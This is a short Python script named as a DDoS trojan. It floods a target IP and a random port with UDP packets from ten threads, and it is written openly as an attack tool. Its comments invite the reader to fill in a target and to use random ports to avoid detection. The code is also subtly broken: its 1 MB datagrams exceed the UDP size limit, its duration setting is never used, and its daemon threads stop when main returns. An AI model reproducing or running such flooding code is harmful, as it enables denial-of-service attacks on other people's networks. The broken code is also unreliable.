import os
import random
import socket
import threading
from datetime import datetime

class DDosTrojan:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.stopped = False

    def send_data(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024 * 1024)  # Random data to flood the network
        while not self.stopped:
            try:
                sock.sendto(data, (self.target_ip, self.target_port))
            except Exception as e:
                print(f"Error sending data: {e}")

    def ddos_attack(self):
        threads = []
        for _ in range(10):  # Number of threads (adjust as needed)
            thread = threading.Thread(target=self.send_data)
            thread.daemon = True
            threads.append(thread)

        for thread in threads:
            thread.start()

    def stop_attack(self):
        self.stopped = True

def main():
    target_ip = "192.168.1.1"  # Replace with your target IP or use input()
    target_port = random.randint(1024, 65535)  # Random port to avoid easy detection
    duration = 60  # Duration of the attack in seconds

    trojan = DDosTrojan(target_ip, target_port, duration)
    trojan.ddos_attack()

if __name__ == "__main__":
    main()
